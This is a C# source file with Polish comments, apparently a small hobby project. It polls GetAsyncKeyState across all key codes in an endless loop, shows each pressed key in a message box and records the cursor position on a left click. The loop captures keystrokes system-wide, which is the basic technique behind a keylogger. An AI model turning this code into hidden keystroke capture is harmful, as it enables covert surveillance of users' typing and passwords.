using MotionCapture;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ReadPositionOfCoursor;
namespace Catchy
{
   public class Catcher
    {
        //Korzystamy z DLL user32, zawiera komendy asynckeystate
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static async Task Main()
        {
            int[] tablicaStanow = new int[255];
            int prevState = -1000;
            int state;
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {

                    state = GetAsyncKeyState(i);
                    //Pierwszy warunek, state > 1
                    if (state > 1 &&
                       //Drugi warunek state nie może różnić się o 1;
                       (tablicaStanow[i] - 1 != state && tablicaStanow[i] + 1 != state) &&
                        //Trzeci warunek state nie może być taki sam 2 razy z rzędu.
                        tablicaStanow[i] != state)
                    {

                        //Jeżeli warunki zostaną spełnione, to wyświetl znak z ASCII
                        if (i == 1)
                        {
                            PositionCursor.GetCursorPos(out POINT lpoint);
                            CoursorPosition.SavedPositionX = lpoint.X;
                            CoursorPosition.SavedPositionY = lpoint.Y;
                        }
                        if (i != 13 && i != 1)
                        {
                            MessageBox.Show((char)i + "");
                        }
                        //else
                            //Console.WriteLine();
                    }
                    //Zapisz stan do tablicy
                    tablicaStanow[i] = state;
                }
                Thread.Sleep(50);
            }
        }
    }
}